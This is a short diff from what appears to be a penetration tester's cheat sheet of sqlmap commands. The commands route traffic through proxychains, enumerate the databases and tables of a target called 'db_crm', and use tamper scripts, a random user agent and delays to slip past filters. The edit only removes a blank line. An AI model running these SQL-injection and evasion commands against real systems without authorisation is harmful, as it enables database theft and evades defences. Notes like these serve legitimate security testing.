@@ -38,7 +38,6 @@ proxychains sqlmap -r reqsqlmap.req --dbs
 proxychains sqlmap -r reqsqlmap.req  -D "db_crm" --tables 
 
 # Tamper
-
 sqlmap -r req.req --level 3 --risk 3 --tamper=space2comment,between --delay=5 --random-agent --threads=1 --batch
 
 ==============================================================================
